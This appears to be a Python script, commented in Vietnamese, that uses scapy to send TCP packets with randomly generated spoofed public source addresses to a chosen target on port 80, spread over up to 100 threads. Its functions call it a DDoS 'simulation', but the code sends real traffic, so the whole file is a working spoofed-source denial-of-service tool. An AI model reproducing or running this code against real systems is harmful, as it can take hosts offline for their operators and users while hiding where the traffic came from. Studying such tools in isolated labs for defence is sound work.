import random
import threading
from scapy.all import IP, TCP, send

NUM_WORKER_THREADS = 100  # Giới hạn số thread tối đa

def generate_random_public_ip():
    """Tạo IP giả ngẫu nhiên, tránh IP private."""
    while True:
        ip = f"{random.randint(1, 223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        # Loại bỏ private ranges
        if not (
            ip.startswith("10.") or
            ip.startswith("192.168.") or
            (ip.startswith("172.") and 16 <= int(ip.split(".")[1]) <= 31)
        ):
            return ip

def ip_chunk_worker(target_ip, ip_list, packets_per_ip, stop_event):
    """
    Worker gửi xen kẽ từ tất cả IP trong nhóm -> tạo lưu lượng đồng thời.
    """
    for _ in range(packets_per_ip):
        if stop_event.is_set():
            return
        for src_ip in ip_list:
            if stop_event.is_set():
                return
            pkt = IP(src=src_ip, dst=target_ip) / TCP(
                sport=random.randint(1024, 65535),
                dport=80
            )
            try:
                send(pkt, verbose=0)
            except Exception as e:
                print(f"[ERROR] {src_ip} -> {target_ip}: {e}")

def simulate_ddos(target_ip, num_ips, packets_per_ip, stop_event):
    """
    Giả lập DDoS: num_ips địa chỉ giả, mỗi IP gửi packets_per_ip request.
    Các IP chia đều cho NUM_WORKER_THREADS và gửi đồng thời.
    """
    print(f"Simulating DDoS attack to {target_ip} from {num_ips} spoofed IPs, {packets_per_ip} req/IP...")

    # Tạo danh sách IP giả public
    fake_ips = [generate_random_public_ip() for _ in range(num_ips)]

    # Chia IP thành các nhóm cho từng thread
    chunk_size = max(1, len(fake_ips) // NUM_WORKER_THREADS)
    threads = []

    for i in range(0, len(fake_ips), chunk_size):
        ip_chunk = fake_ips[i:i+chunk_size]
        t = threading.Thread(target=ip_chunk_worker, args=(target_ip, ip_chunk, packets_per_ip, stop_event))
        t.start()
        threads.append(t)

    # Chờ tất cả worker hoàn tất
    for t in threads:
        t.join()

    if not stop_event.is_set():
        print("ATTACK: Simulation finished.")
